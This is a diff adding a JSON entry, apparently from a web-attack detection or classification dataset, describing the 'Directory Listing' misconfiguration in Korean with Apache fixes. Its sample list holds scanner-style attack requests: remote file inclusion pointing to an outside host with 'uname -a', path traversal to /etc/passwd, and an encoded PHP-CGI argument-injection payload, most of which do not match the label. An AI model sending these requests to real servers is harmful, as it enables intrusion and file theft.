@@ -1,0 +1,24 @@
+{
+        "Name": "Directory Listing",
+        "Description": "-WAS의 환결 설정 미흡으로 인한 웹 디렉터리가 외부에 노출\n-브라우징 하는 모든 파일을 보여주게 됨 (디렉토리 목록)\n-백업파일, 소스코드, 스크립트 파일 노출로 인한 다양한 정보를 공격자에게 제공함으로써 다양한 공격에 이용\n-httpd.conf 파일 내 Options에서 Indexes 제거\n-httpd.conf 파일 내 Directory 태그의 Option 지시자에서 Multiview 제거",
+        "References": [],
+        "Samples": [
+			"GET /cgi-bin//atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://xxxxxxxxxx/ HTTP/1.1",
+			"GET /cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1",
+			"GET /cgi-bin/guestbook.cgi HTTP/1.1",
+			"POST /cgi-bin/php4.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1",
+			"GET /cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1542257534&lang_crm=../../../../../../../../../../../..//etc/passwd%00 HTTP/1.1",
+			"GET /images/top2.jpg/topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uNikto -a",
+			"GET /images/top2.jpg/topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uname -a",
+			"GET /images/top2.jpg/index.php?page=http://cirt.net/rfiinc.txt?%00 HTTP/1.1",
+			"GET /topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uname -a",
+			"HEAD /cgi-bin/www/ HTTP/1.1",
+			"HEAD /cgi-bin/12-www/ HTTP/1.1",
+			"GET /images/top2.jpg/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd HTTP/1.1",
+			"GET /cgi-perl/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd HTTP/1.1",
+			"GET /cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1542257534&lang_crm=../../../../../../../../../../../..//etc/passwd%00 HTTP/1.1",
+			"HEAD /images/evaluate2/ HTTP/1.1",
+			"HEAD /MostPrevalentPests.html HTTP/1.1"],
+        "Keywords": [],
+        "Signature":[]
+}
